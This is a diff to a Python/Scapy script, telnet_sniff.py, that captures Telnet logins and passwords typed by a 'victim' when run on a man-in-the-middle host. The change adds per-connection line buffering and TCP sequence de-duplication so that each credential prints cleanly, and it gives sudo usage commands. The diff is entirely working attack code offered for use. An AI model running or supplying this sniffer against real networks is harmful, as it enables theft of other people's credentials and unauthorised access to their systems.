@@ -10,12 +10,18 @@ Prereqs:
 How it works:
   Telnet is unencrypted and sends the client's keystrokes to the server on
   TCP port 23. We sniff only the client -> server direction (dport 23), strip
-  the Telnet IAC option-negotiation bytes, and print the remaining printable
-  characters. The server does NOT echo the password, but the CLIENT still
-  transmits it in the clear -- so watching client -> server reveals it anyway.
+  the Telnet IAC option-negotiation bytes, buffer the printable characters per
+  connection, and print one clean line each time the victim presses Enter. The
+  server does NOT echo the password, but the CLIENT still transmits it in the
+  clear -- so watching client -> server reveals it anyway.
+
+  Because we run on the MITM host, each keystroke segment crosses our interface
+  twice (once received from the client, once re-sent to the server by IP
+  forwarding), and TCP may also retransmit. We de-duplicate on the TCP sequence
+  number so every character is shown exactly once.
 
 Usage:
-  sudo python3 telnet_sniff.py -i eth0            # sniff all telnet clients
+  sudo python3 telnet_sniff.py -i eth0                     # all telnet clients
   sudo python3 telnet_sniff.py -i eth0 --server 10.0.0.5   # one server only
 """
 from scapy.all import IP, TCP, Raw, sniff
@@ -55,25 +61,48 @@ def strip_telnet(data):
 
 
 def make_handler(server):
+    lines = {}       # (ip, port) -> the line currently being typed
+    next_seq = {}    # (ip, port) -> next expected TCP seq, to drop duplicates
+
     def process(pkt):
         # client -> server keystrokes only
         if not (pkt.haslayer(TCP) and pkt[TCP].dport == 23 and pkt.haslayer(Raw)):
             return
         if server and pkt[IP].dst != server:
             return
-        typed = strip_telnet(bytes(pkt[Raw].load))
-        # keep printable ASCII plus newline/carriage-return
-        text = "".join(chr(c) if 32 <= c < 127 else
-                       ("\n" if c in (10, 13) else "") for c in typed)
-        if text:
-            src = pkt[IP].src
-            print("[{} -> :23] {}".format(src, text), end="", flush=True)
+
+        key = (pkt[IP].src, pkt[TCP].sport)
+        seq = pkt[TCP].seq
+        raw = bytes(pkt[Raw].load)
+
+        # On the MITM host each segment appears twice (received + forwarded),
+        # and TCP may retransmit. Anything at or below what we've already
+        # consumed is a duplicate -- skip it so each keystroke prints once.
+        exp = next_seq.get(key)
+        if exp is not None and seq < exp:
+            return
+        next_seq[key] = seq + len(raw)
+
+        buf = lines.get(key, "")
+        for c in strip_telnet(raw):
+            if c in (10, 13):                 # Enter -> the line is complete
+                if buf:
+                    print("[{}:{}]  {}".format(pkt[IP].src, pkt[TCP].sport, buf),
+                          flush=True)
+                buf = ""
+            elif 32 <= c < 127:               # printable -> keep it
+                buf += chr(c)
+            # everything else (NUL, other control bytes) is ignored
+        lines[key] = buf
+
     return process
 
 
 def main():
     a = build_args()
     print("[*] Sniffing Telnet keystrokes on {} (Ctrl+C to stop)".format(a.iface))
+    print("[*] Each line is one thing the victim pressed Enter on "
+          "-- typically the login, then the password:\n")
     sniff(iface=a.iface, store=False, prn=make_handler(a.server),
           filter="tcp port 23")
 
